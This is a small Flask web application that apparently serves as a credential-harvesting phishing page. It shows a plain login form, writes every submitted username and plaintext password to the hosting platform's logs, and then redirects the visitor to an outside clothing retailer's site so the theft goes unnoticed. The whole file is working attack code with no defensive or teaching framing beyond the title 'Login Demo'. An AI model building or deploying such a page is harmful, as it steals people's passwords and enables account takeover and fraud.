from flask import Flask, request, redirect, render_template_string
import logging

app = Flask(__name__)

# Configure logging so we can see in Render logs
logging.basicConfig(level=logging.INFO)

# Simple HTML login page
login_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Login Demo</title>
</head>
<body>
    <h2>Login</h2>
    <form method="POST">
        <label>Username:</label><br>
        <input type="text" name="username" required><br><br>
        <label>Password:</label><br>
        <input type="password" name="password" required><br><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Log credentials to Render logs
        app.logger.info(f"Login attempt - Username: {username}, Password: {password}")

        # Redirect to Ex Clothi (make sure this URL is correct)
        return redirect("https://www.exclothi.com")

    return render_template_string(login_page)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)


